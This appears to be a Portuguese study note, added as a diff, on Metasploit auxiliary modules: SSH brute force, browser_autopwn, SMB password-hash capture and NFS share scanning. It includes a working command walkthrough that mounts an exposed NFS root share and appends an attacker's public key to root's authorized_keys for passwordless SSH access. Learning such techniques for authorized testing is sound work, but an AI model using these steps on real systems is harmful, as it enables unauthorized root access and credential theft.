@@ -1,0 +1,59 @@
+O modo "Auxiliary", dentro do metaesploit, não possui payload, mas aplicativos que ajudam no momento de realizar a exploração, pelo proprio console do metaesplot.
+-Ex: Scanner de aplicativos, hosts etc
+
+auxiliary/scanner
+auxiliary/server
+auxiliary/server/capture/  (Esse modulo, possui ferramentas para captura de login, emulando servidores)
+
+Exemplo de modo auxiliar:
+  auxiliary/scanner/ssh/ssh_login
+  -Esse modo ajuda a realizar um teste de força bruta via ssh
+  
+Para utilização, usar o comando "use" + modulo auxiliar
+---------------------------------
+
+auxiliary/server/browser_autopwn
+
+Esse modulo é uma opção para exploit em navegador, utilizando todos os exploits possiveis para testar falhas em navegadores.
+-Caso o browser da vitima não seja vulneravel em relação a versão, ou o java ou flash
+
+ --------------------------------
+ Captura o hash da senha via SMB
+ 
+ auiliary/server/capture/smb
+
+Esse modulo providencia um servidor SMB, e captura o hash de senha do usuario, caso ele acesse o compartilhamento.
+--------------------------------
+Esse modulo permite verificar compartilhamentos NFS em hosts remotos.
+
+auxiliary/scanner/nfs/nfsmount
+
+Podemos descobrir compartilhamentos NFS e enjetar arquivos ou até mesmo uma chave publica para acesso via ssh.
+
+use auxiliary/scanner/nfs/nfsmount
+
+set RHOSTS 192.168.1.6
+
+exploit
+
+####Ira mostrar os compartilhamentos disponiveis, caso esteja com o "/" disponivel...
+
+Montando o compartilhamento no KALI:
+
+mount -o nolock -t nfs 192.168.1.11:/ /mnt/dir
+###O sistema ficara disponivel no diretorio local.
+
+Gerar no Kali uma chave.
+
+ssh-keygen
+
+Copiar a chave criada para o sistema remoto, montado no NFS.
+
+cat id_rsa.pub >> /mnt/dir/root/.ssh/authorized_keys
+
+Dessa maneira, a chave foi enviada para o final do arquivo authorized keys remoto, e ja podemos acessar com a nossa chave o ssh sem senha.
+
+----------------------
+
+Verificar modulos no site "offencive security"
+-Manuais e documentos com screenshots de exploits e etc.
